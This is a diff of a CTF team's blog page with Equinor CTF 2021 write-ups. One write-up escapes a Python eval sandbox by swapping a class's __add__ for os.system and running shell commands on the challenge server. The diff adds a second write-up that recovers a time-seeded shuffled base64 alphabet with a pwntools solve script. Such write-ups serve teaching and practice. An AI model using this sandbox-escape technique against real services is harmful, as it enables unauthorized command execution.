@@ -6,7 +6,7 @@
 <title>Equinor CTF 2021 | Blog | bootplug</title>
 <meta name=keywords content="ctf,web,forensics,reversing,pwn,ics,crypto">
 <meta name=description content="Writeups from Equinor's CTF">
-<meta name=author content="zup">
+<meta name=author content="zup, KFBI">
 <link rel=canonical href=https://bootplug.io/posts/ctf/equinorctf/>
 <link crossorigin=anonymous href=/assets/css/stylesheet.min.6f60056d44d3f7eb69a4bc6c332b59960f3a995802bded244750232f33713c49.css integrity="sha256-b2AFbUTT9+tppLxsMytZlg86mVgCve0kR1AjLzNxPEk=" rel="preload stylesheet" as=style>
 <link rel=preload href=/images/bootplug.png as=image>
@@ -33,7 +33,7 @@
 <meta name=twitter:title content="Equinor CTF 2021">
 <meta name=twitter:description content="Writeups from Equinor's CTF">
 <script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bootplug.io/posts/"},{"@type":"ListItem","position":2,"name":"CTFs","item":"https://bootplug.io/posts/ctf/"},{"@type":"ListItem","position":3,"name":"Equinor CTF 2021","item":"https://bootplug.io/posts/ctf/equinorctf/"}]}</script>
-<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Equinor CTF 2021","name":"Equinor CTF 2021","description":"Writeups from Equinor's CTF","keywords":["ctf","web","forensics","reversing","pwn","ics","crypto"],"articleBody":"Misc 🔥 Kalk 🔥  Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\n We get a Python script to download:\n#!/usr/bin/env python3 import dis import os class Math(dict): def __init__(self): self.e = 0 self.pi = 0 def kalk(src, locals): if '=' in src: co = compile(src, \"kalk\", \"single\") for opc in dis.get_instructions(co): if opc.opname not in ['LOAD_NAME', 'LOAD_CONST', 'STORE_NAME', 'STORE_ATTR', 'RETURN_VALUE']: print(\"Bonk! ., opc.opname) return eval(co, {}, locals) else: co = compile(src, \"kalk\", \"eval\") for opc in dis.get_instructions(co): if 'CALL' in opc.opname: print('No U! .) return _ = eval(co, {}, locals | {'math': Math(), 'tease': os.system}) locals['_'] = _ return _ locals = {} while True: r = kalk(input(' '), locals) if r is not None: print(repr(r)) It looks like this is a calculator as a service. When you connect to the server you can do different math operations. This is done by executing the input you send as Python code. It uses eval to do so.\nIt looks like this application block certain types of operations. It does so by compiling the input that we send in, and uses the dis module to get the instructions and opnames from the compiled code. You can for example don’t run any functions or methods, because it blocks all opname that contains CALL.\nIn the kalk function there is an if statement that checks for = in our input. If we don’t assign a value to any variable, it will jump down to the else block and run our code there. As you can see, there are two objects included in the local variables in this eval. math contains a Math-object and tease contains the os.system method.\nSince math is an object of the Math-class, we can probably try to overwrite a dunder-method (method names with double underscores which are called in specific ways). The only problem is that we cannot assign anything to the math object, since then we will be in the first if-block where this object is not available.\nUnblvR on my team found a neat way to move variables from the second eval to the first eval by using _. _ is a special variable that contains the return value of the last instruction. This variable is also available in the first eval even though we did the instruction in the second eval.\nNow we can assign math to another variable:\nnc io.ept.gg 30046  math {}  test = _  test {} The plan is to get the uninitialized Math class into a variable and then overwrite the __add__ method to be tease which is os.system. The __add__ method takes one argument (which is the value you want to add to the object). os.system() also takes one argument, so in theory we can then do a system command by adding the command we want to run to the object like this: math + 'ls -la'\nThe command ls -la should then be executed.\nYou can read more about dunder methods HERE!\nFirst we need to get the Math class:\nnc io.ept.gg 30046  math.__class__ class '__main__.Math'  Math = _  Math class '__main__.Math' Great, now we can overwrite __add__ with os.system\n tease built-in function system  Math.__add__ = _ At last we can set the class of math to be our new class.\n math {}  math = _  math.__class__ = Math Now we should be able to run system commands by doing addition.\n math + \"id\" uid=1000(kalk) gid=1000(kalk) groups=1000(kalk) 0  math + \"ls\" flag.txt kalk.py ynetd 0  math + \"cat flag.txt\" EPT{y0u_br0k3_my_c4lcu1at0r!}0 And we got the flag, great!\nFlag: EPT{y0u_br0k3_my_c4lcu1at0r!}\n","wordCount":"623","inLanguage":"en","datePublished":"2021-10-31T15:17:02+01:00","dateModified":"2021-10-31T15:17:02+01:00","author":[{"@type":"Person","name":"zup"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://bootplug.io/posts/ctf/equinorctf/"},"publisher":{"@type":"Organization","name":"Blog | bootplug","logo":{"@type":"ImageObject","url":"https://bootplug.io/favicon.ico"}}}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Equinor CTF 2021","name":"Equinor CTF 2021","description":"Writeups from Equinor's CTF","keywords":["ctf","web","forensics","reversing","pwn","ics","crypto"],"articleBody":"Misc 🔥 Kalk 🔥  Author: null\nDescription: I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!\nnc io.ept.gg 30046\n We get a Python script to download:\n#!/usr/bin/env python3 import dis import os class Math(dict): def __init__(self): self.e = 0 self.pi = 0 def kalk(src, locals): if '=' in src: co = compile(src, \"kalk\", \"single\") for opc in dis.get_instructions(co): if opc.opname not in ['LOAD_NAME', 'LOAD_CONST', 'STORE_NAME', 'STORE_ATTR', 'RETURN_VALUE']: print(\"Bonk! ., opc.opname) return eval(co, {}, locals) else: co = compile(src, \"kalk\", \"eval\") for opc in dis.get_instructions(co): if 'CALL' in opc.opname: print('No U! .) return _ = eval(co, {}, locals | {'math': Math(), 'tease': os.system}) locals['_'] = _ return _ locals = {} while True: r = kalk(input(' '), locals) if r is not None: print(repr(r)) It looks like this is a calculator as a service. When you connect to the server you can do different math operations. This is done by executing the input you send as Python code. It uses eval to do so.\nIt looks like this application block certain types of operations. It does so by compiling the input that we send in, and uses the dis module to get the instructions and opnames from the compiled code. You can for example don’t run any functions or methods, because it blocks all opname that contains CALL.\nIn the kalk function there is an if statement that checks for = in our input. If we don’t assign a value to any variable, it will jump down to the else block and run our code there. As you can see, there are two objects included in the local variables in this eval. math contains a Math-object and tease contains the os.system method.\nSince math is an object of the Math-class, we can probably try to overwrite a dunder-method (method names with double underscores which are called in specific ways). The only problem is that we cannot assign anything to the math object, since then we will be in the first if-block where this object is not available.\nUnblvR on my team found a neat way to move variables from the second eval to the first eval by using _. _ is a special variable that contains the return value of the last instruction. This variable is also available in the first eval even though we did the instruction in the second eval.\nNow we can assign math to another variable:\nnc io.ept.gg 30046  math {}  test = _  test {} The plan is to get the uninitialized Math class into a variable and then overwrite the __add__ method to be tease which is os.system. The __add__ method takes one argument (which is the value you want to add to the object). os.system() also takes one argument, so in theory we can then do a system command by adding the command we want to run to the object like this: math + 'ls -la'\nThe command ls -la should then be executed.\nYou can read more about dunder methods HERE!\nFirst we need to get the Math class:\nnc io.ept.gg 30046  math.__class__ class '__main__.Math'  Math = _  Math class '__main__.Math' Great, now we can overwrite __add__ with os.system\n tease built-in function system  Math.__add__ = _ At last we can set the class of math to be our new class.\n math {}  math = _  math.__class__ = Math Now we should be able to run system commands by doing addition.\n math + \"id\" uid=1000(kalk) gid=1000(kalk) groups=1000(kalk) 0  math + \"ls\" flag.txt kalk.py ynetd 0  math + \"cat flag.txt\" EPT{y0u_br0k3_my_c4lcu1at0r!}0 And we got the flag, great!\nFlag: EPT{y0u_br0k3_my_c4lcu1at0r!}\n🔥 Know your encoding 🔥  Author: zledge\nDescription: Help us decode some very important words! You might be awarded a flag in the end\nnc io.ept.gg 30045\n We are also provided with a file:\nfrom datetime import datetime from random import Random from time import time def chunks(lst, n): \"\"\"Yield successive n-sized chunks from lst.\"\"\" for i in range(0, len(lst), n): yield lst[i:i + n] ALPHABET = 'abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789' def special_encoding(word, count): b = Random() b.seed(int(time() * 1000)) if count: a = ''.join(b.sample(ALPHABET,len(ALPHABET))) else: a = ALPHABET encoded = '' for x in chunks(\"\".join([bin(int(byte)).lstrip('0b').zfill(8) for byte in word.encode(\"ascii\")]), 24): y = list(chunks(x, 6)) for value in y: encoded += a[int(value.ljust(6, \"0\"), 2)] print(f\"{datetime.fromtimestamp(int(time()))}- Decode the following: {encoded}\", flush=True) Upon connecting we’re greeted with this:\nSomeone created an encoding scheme, and now we have trouble decoding the output. Can you help us out? You have 5 seconds per word. All words are lowercase ascii before encoding. Are you ready? After answering we’re greeted with a challenge:\n2021-10-31 18:20:50 - Decode the following: BgKMAwvTChm\nSo let’s analyze the code:\n chunks is explained with a docstring, so we can move on to special_encoding immediately First it gets the current amount of seconds since 1. January 1970 also known as unix-time. ( time() ) This is then multiplied with 1000 to get millisecond precision. (time()*1000) Lastly it’s fed into a random generator as a seed. based on a variable count it then either generated a random shuffled alphabet or uses the standard one Then in the following 4 lines it base64 encodes the word (more detailed explanation inside)  Firstly it generates a long bitstring and divides it up into 24 bits at a time Then it’s divided furthermore into chunks of 6 bits based on the value of these 6 bits it picks the corresponding character from the “alphabet-lookup string” a   After looping over the whole bitstring the encoded result is provided prefixed with the server’s current time.  Before I show the solution script there’s a few gotchas with this challenge that I’d like to mention first.\ncount variable As mentioned in the analysis special_encoding chooses which alphabet to use based on a count variable, however we don’t know the value of this variable and so we can’t be completely sure of which alphabet is used. We can make a educated guess and think that count is like a round counter starting at zero, meaning only the first round will be base64\nTimezones Timezones are always a pain to deal with, and this challenge is no exception, because if you just parse the time from the server you’ll get the wrong result. What you need to do, or what I had to do was add 3600 seconds to the time parsed.\ntime() invoked twice So a small detail that’s worth noticing is that the time() used to seed the random generator isn’t quite the same as the time presented to us. As time is invoked two times instead of being saved to a variable, this didn’t pose any problems for me. But could become a problem if the system is already stressed.\nSo without further adieu, the solve script:\nfrom datetime import datetime from pwn import remote, log from random import Random from Crypto.Util.number import long_to_bytes from string import ascii_lowercase ALPHABET = 'abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789' def decode(s, mapping): bs = \"\".join([bin(mapping.index(c)).lstrip(\"0b\").zfill(6) for c in s]) bs = bs[:(len(bs) // 8) * 8] return long_to_bytes(int(bs, 2)) def solve(base_time, chall): for drift in range(1000): tm = base_time * 1000 + drift b = Random() b.seed(tm) for mapping in [''.join(b.sample(ALPHABET, len(ALPHABET))), ALPHABET]: bts = decode(chall, mapping) if all([chr(char) in ascii_lowercase for char in bts]): return bts else: log.error(\"Couldn't find solution\") r = remote(\"io.ept.gg\", 30045) r.sendline(b\"y\") r.recvline() r.recvline() for i in range(100): chal = r.recvline().decode() dt = datetime.fromisoformat(chal.split(\" - \")[0]).strftime(\"%s\") server_time = int(dt) + 3600 # adjust to the same timezone as the server ans = solve(server_time, chal.split(\": \")[1].strip()) print(ans) r.sendline(ans) assert r.recvline() == b\"Correct!\\n\" r.interactive() Further explanation brute force So since we know the time the random alphabet was generated we can just reproduce it locally. After we have the time (that’s corrected for the timezone) we have to do some brute force, because the time value we’re provided with is only in second resolution and the random seed function required millisecond resolution. Using this base value we should brute force around that base I chose a span of 0-1000ms after the base time.\ndecoding Now inside the loop we can feed these time values into the Random.seed() function. Then we can generate our random alphabet and try to decode the challenge sent by the server with both the random alphabet and the standard one. The decoding works by taking each char in the encoded string and finding it’s corresponding position in the alphabet, then we convert that value to binary, stripping the 0b and ensuring it’s 6 chars long. After that we strip the bitstring into the nearest length that’s divisible by 8. Then we parse it as a binary number and convert it from a int to bytes, and we’re done.\nsubmitting So now we have a possible correct result, but since we’re brute forcing this could be a garbage value as well. So we have to check that all the characters are printable and ASCII-lowercase, then we can be pretty certain that we’ve found the correct answer. But we won’t know for sure before the server responds with Correct!. Again if we bruteforced with a wider range for the drift we might begin to get false positives.\nFlag: EPT{kn0w-y0ur-en0ding!}\n","wordCount":"1545","inLanguage":"en","datePublished":"2021-10-31T15:17:02+01:00","dateModified":"2021-10-31T15:17:02+01:00","author":[{"@type":"Person","name":"zup"},{"@type":"Person","name":"KFBI"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://bootplug.io/posts/ctf/equinorctf/"},"publisher":{"@type":"Organization","name":"Blog | bootplug","logo":{"@type":"ImageObject","url":"https://bootplug.io/favicon.ico"}}}</script>
 </head>
 <body id=top>
 <script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
@@ -81,7 +81,7 @@ Equinor CTF 2021
 <div class=post-description>
 Writeups from Equinor's CTF
 </div>
-<div class=post-meta>October 31, 2021&nbsp;·&nbsp;3 min&nbsp;·&nbsp;zup
+<div class=post-meta>October 31, 2021&nbsp;·&nbsp;8 min&nbsp;·&nbsp;zup, KFBI
 </div>
 </header> <div class=toc>
 <details open>
@@ -92,7 +92,27 @@ Writeups from Equinor's CTF
 <li>
 <a href=#misc aria-label=Misc>Misc</a><ul>
 <li>
-<a href=#-kalk- aria-label="🔥 Kalk 🔥">🔥 Kalk 🔥</a>
+<a href=#-kalk- aria-label="🔥 Kalk 🔥">🔥 Kalk 🔥</a></li>
+<li>
+<a href=#-know-your-encoding- aria-label="🔥 Know your encoding 🔥">🔥 Know your encoding 🔥</a><ul>
+<li>
+<a href=#count-variable aria-label="count variable">count variable</a></li>
+<li>
+<a href=#timezones aria-label=Timezones>Timezones</a></li>
+<li>
+<a href=#time-invoked-twice aria-label="time() invoked twice">time() invoked twice</a></li>
+<li>
+<a href=#further-explanation aria-label="Further explanation">Further explanation</a><ul>
+<li>
+<a href=#brute-force aria-label="brute force">brute force</a></li>
+<li>
+<a href=#decoding aria-label=decoding>decoding</a></li>
+<li>
+<a href=#submitting aria-label=submitting>submitting</a>
+</li>
+</ul>
+</li>
+</ul>
 </li>
 </ul>
 </li>
@@ -205,6 +225,130 @@ ynetd
 EPT{y0u_br0k3_my_c4lcu1at0r<span style=color:#960050;background-color:#1e0010>!</span>}<span style=color:#ae81ff>0</span>
 </code></pre></div><p>And we got the flag, great!</p>
 <p>Flag: <code>EPT{y0u_br0k3_my_c4lcu1at0r!}</code></p>
+<h2 id=-know-your-encoding->🔥 Know your encoding 🔥<a hidden class=anchor aria-hidden=true href=#-know-your-encoding->#</a></h2>
+<blockquote>
+<p><strong>Author</strong>: <code>zledge</code></p>
+<p><strong>Description:</strong>
+Help us decode some very important words! You might be awarded a flag in the end</p>
+<p><code>nc io.ept.gg 30045</code></p>
+</blockquote>
+<p>We are also provided with a file:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> datetime <span style=color:#f92672>import</span> datetime
+<span style=color:#f92672>from</span> random <span style=color:#f92672>import</span> Random
+<span style=color:#f92672>from</span> time <span style=color:#f92672>import</span> time
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>chunks</span>(lst, n):
+    <span style=color:#e6db74>&#34;&#34;&#34;Yield successive n-sized chunks from lst.&#34;&#34;&#34;</span>
+    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(lst), n):
+        <span style=color:#66d9ef>yield</span> lst[i:i <span style=color:#f92672>+</span> n]
+
+ALPHABET <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789&#39;</span>
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>special_encoding</span>(word, count):
+    b <span style=color:#f92672>=</span> Random()
+    b<span style=color:#f92672>.</span>seed(int(time() <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span>))
+    <span style=color:#66d9ef>if</span> count:
+        a <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(b<span style=color:#f92672>.</span>sample(ALPHABET,len(ALPHABET)))
+    <span style=color:#66d9ef>else</span>:
+        a <span style=color:#f92672>=</span> ALPHABET
+    encoded <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+    <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> chunks(<span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join([bin(int(byte))<span style=color:#f92672>.</span>lstrip(<span style=color:#e6db74>&#39;0b&#39;</span>)<span style=color:#f92672>.</span>zfill(<span style=color:#ae81ff>8</span>) <span style=color:#66d9ef>for</span> byte <span style=color:#f92672>in</span> word<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;ascii&#34;</span>)]), <span style=color:#ae81ff>24</span>):
+        y <span style=color:#f92672>=</span> list(chunks(x, <span style=color:#ae81ff>6</span>))
+        <span style=color:#66d9ef>for</span> value <span style=color:#f92672>in</span> y:
+            encoded <span style=color:#f92672>+=</span> a[int(value<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>6</span>, <span style=color:#e6db74>&#34;0&#34;</span>), <span style=color:#ae81ff>2</span>)]
+    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>datetime<span style=color:#f92672>.</span>fromtimestamp(int(time()))<span style=color:#e6db74>}</span><span style=color:#e6db74> - Decode the following: </span><span style=color:#e6db74>{</span>encoded<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, flush<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
+</code></pre></div><p>Upon connecting we&rsquo;re greeted with this:</p>
+<pre tabindex=0><code>Someone created an encoding scheme, and now we have trouble decoding the output. Can you help us out? You have 5 seconds per word. All words are lowercase ascii before encoding.
+Are you ready?
+</code></pre><p>After answering we&rsquo;re greeted with a challenge:</p>
+<p><code>2021-10-31 18:20:50 - Decode the following: BgKMAwvTChm</code></p>
+<p>So let&rsquo;s analyze the code:</p>
+<ol>
+<li><code>chunks</code> is explained with a docstring, so we can move on to <code>special_encoding</code> immediately</li>
+<li>First it gets the current amount of seconds since 1. January 1970 also known as unix-time. ( <code>time()</code> )</li>
+<li>This is then multiplied with 1000 to get millisecond precision. (<code>time()*1000</code>)</li>
+<li>Lastly it&rsquo;s fed into a random generator as a seed.</li>
+<li>based on a variable <code>count</code> it then either generated a random shuffled alphabet or uses the standard one</li>
+<li>Then in the following 4 lines it base64 encodes the <code>word</code> (more detailed explanation inside)
+<ol>
+<li>Firstly it generates a long bitstring and divides it up into 24 bits at a time</li>
+<li>Then it&rsquo;s divided furthermore into chunks of 6 bits</li>
+<li>based on the value of these 6 bits it picks the corresponding character from the &ldquo;alphabet-lookup string&rdquo; <code>a</code></li>
+</ol>
+</li>
+<li>After looping over the whole bitstring the encoded result is provided prefixed with the server&rsquo;s current time.</li>
+</ol>
+<p>Before I show the solution script there&rsquo;s a few gotchas with this challenge that I&rsquo;d like to mention first.</p>
+<h3 id=count-variable>count variable<a hidden class=anchor aria-hidden=true href=#count-variable>#</a></h3>
+<p>As mentioned in the analysis <code>special_encoding</code> chooses which alphabet to use based on a <code>count</code> variable,
+however we don&rsquo;t know the value of this variable and so we can&rsquo;t be completely sure of which alphabet is used.
+We can make a educated guess and think that <code>count</code> is like a round counter starting at zero, meaning only the
+first round will be base64</p>
+<h3 id=timezones>Timezones<a hidden class=anchor aria-hidden=true href=#timezones>#</a></h3>
+<p>Timezones are always a pain to deal with, and this challenge is no exception, because if you just parse the time
+from the server you&rsquo;ll get the wrong result. What you need to do, or what I had to do was add 3600 seconds to
+the time parsed.</p>
+<h3 id=time-invoked-twice>time() invoked twice<a hidden class=anchor aria-hidden=true href=#time-invoked-twice>#</a></h3>
+<p>So a small detail that&rsquo;s worth noticing is that the time() used to seed the random generator isn&rsquo;t quite the same as the time presented to us. As time is invoked two times instead of being saved to a variable, this didn&rsquo;t pose any problems for me. But could become a problem if the system is already stressed.</p>
+<p>So without further adieu, the solve script:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> datetime <span style=color:#f92672>import</span> datetime
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> remote, log
+<span style=color:#f92672>from</span> random <span style=color:#f92672>import</span> Random
+<span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
+<span style=color:#f92672>from</span> string <span style=color:#f92672>import</span> ascii_lowercase
+
+ALPHABET <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789&#39;</span>
+
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decode</span>(s, mapping):
+    bs <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join([bin(mapping<span style=color:#f92672>.</span>index(c))<span style=color:#f92672>.</span>lstrip(<span style=color:#e6db74>&#34;0b&#34;</span>)<span style=color:#f92672>.</span>zfill(<span style=color:#ae81ff>6</span>) <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> s])
+    bs <span style=color:#f92672>=</span> bs[:(len(bs) <span style=color:#f92672>//</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>]
+    <span style=color:#66d9ef>return</span> long_to_bytes(int(bs, <span style=color:#ae81ff>2</span>))
+
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>solve</span>(base_time, chall):
+    <span style=color:#66d9ef>for</span> drift <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1000</span>):
+        tm <span style=color:#f92672>=</span> base_time <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span> <span style=color:#f92672>+</span> drift
+
+        b <span style=color:#f92672>=</span> Random()
+        b<span style=color:#f92672>.</span>seed(tm)
+
+        <span style=color:#66d9ef>for</span> mapping <span style=color:#f92672>in</span> [<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(b<span style=color:#f92672>.</span>sample(ALPHABET, len(ALPHABET))), ALPHABET]:
+            bts <span style=color:#f92672>=</span> decode(chall, mapping)
+            <span style=color:#66d9ef>if</span> all([chr(char) <span style=color:#f92672>in</span> ascii_lowercase <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> bts]):
+                <span style=color:#66d9ef>return</span> bts
+    <span style=color:#66d9ef>else</span>:
+        log<span style=color:#f92672>.</span>error(<span style=color:#e6db74>&#34;Couldn&#39;t find solution&#34;</span>)
+
+
+r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;io.ept.gg&#34;</span>, <span style=color:#ae81ff>30045</span>)
+r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;y&#34;</span>)
+r<span style=color:#f92672>.</span>recvline()
+r<span style=color:#f92672>.</span>recvline()
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>100</span>):
+    chal <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>decode()
+
+    dt <span style=color:#f92672>=</span> datetime<span style=color:#f92672>.</span>fromisoformat(chal<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; - &#34;</span>)[<span style=color:#ae81ff>0</span>])<span style=color:#f92672>.</span>strftime(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span>)
+
+    server_time <span style=color:#f92672>=</span> int(dt) <span style=color:#f92672>+</span> <span style=color:#ae81ff>3600</span>  <span style=color:#75715e># adjust to the same timezone as the server</span>
+
+    ans <span style=color:#f92672>=</span> solve(server_time, chal<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;: &#34;</span>)[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>strip())
+    print(ans)
+    r<span style=color:#f92672>.</span>sendline(ans)
+    <span style=color:#66d9ef>assert</span> r<span style=color:#f92672>.</span>recvline() <span style=color:#f92672>==</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Correct!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
+
+r<span style=color:#f92672>.</span>interactive()
+</code></pre></div><h3 id=further-explanation>Further explanation<a hidden class=anchor aria-hidden=true href=#further-explanation>#</a></h3>
+<h4 id=brute-force>brute force<a hidden class=anchor aria-hidden=true href=#brute-force>#</a></h4>
+<p>So since we know the time the random alphabet was generated we can just reproduce
+it locally. After we have the time (that&rsquo;s corrected for the timezone) we have to
+do some brute force, because the time value we&rsquo;re provided with is only in second
+resolution and the random seed function required millisecond resolution. Using this base value we should brute force around that base I chose a span of 0-1000ms after the base time.</p>
+<h4 id=decoding>decoding<a hidden class=anchor aria-hidden=true href=#decoding>#</a></h4>
+<p>Now inside the loop we can feed these time values into the <code>Random.seed()</code> function. Then we can generate our random alphabet and try to decode the challenge sent by the server with both the random alphabet and the standard one. The decoding works by taking each char in the encoded string and finding it&rsquo;s corresponding position in the alphabet, then we convert that value to binary, stripping the <code>0b</code> and ensuring it&rsquo;s 6 chars long. After that we strip the bitstring into the nearest length that&rsquo;s divisible by 8. Then we parse it as a binary number and convert it from a int to bytes, and we&rsquo;re done.</p>
+<h4 id=submitting>submitting<a hidden class=anchor aria-hidden=true href=#submitting>#</a></h4>
+<p>So now we have a possible correct result, but since we&rsquo;re brute forcing this could be a garbage value as well. So we have to check that all the characters are printable
+and ASCII-lowercase, then we can be pretty certain that we&rsquo;ve found the correct answer. But we won&rsquo;t know for sure before the server responds with <code>Correct!</code>. Again if we bruteforced with a wider range for the <code>drift</code> we might begin to get false positives.</p>
+<p>Flag: <code>EPT{kn0w-y0ur-en0ding!}</code></p>
 </div>
 <footer class=post-footer>
 <ul class=post-tags>
